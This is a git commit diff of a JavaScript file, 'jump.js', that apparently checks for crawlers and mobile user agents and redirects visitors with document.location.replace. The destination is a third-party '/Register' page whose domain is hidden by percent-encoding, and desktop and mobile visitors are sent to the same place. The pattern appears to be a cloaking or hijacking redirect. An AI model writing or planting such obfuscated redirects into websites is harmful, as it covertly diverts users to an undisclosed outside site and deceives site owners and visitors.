939cc49fd8478f7806a8cd0574eef96eeccbb8e6
lanmao0712 <67860747+lanmao0712@users.noreply.github.com>
2020-07-05 22:08:05 +0800

    Update jump.js

--- jump.js
+++ jump.js
@@ -9,9 +9,9 @@ if(where.indexOf('spider')!= -1){
           navigator.userAgent.match(
             /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
           )){
-            document.location.replace('https://%77%77%77%2d%31%31%37%35%61%61%2e%63%6f%6d/%52%65%67%69%73%74%65%72')
+            document.location.replace('https://%77%77%77%2d%31%31%37%35%61%61%2e%63%6f%6d/Register')
           } else {
-            document.location.replace('https://%77%77%77%2d%31%31%37%35%61%61%2e%63%6f%6d/%52%65%67%69%73%74%65%72')
+            document.location.replace('https://%77%77%77%2d%31%31%37%35%61%61%2e%63%6f%6d/Register')
        }
 }
 }
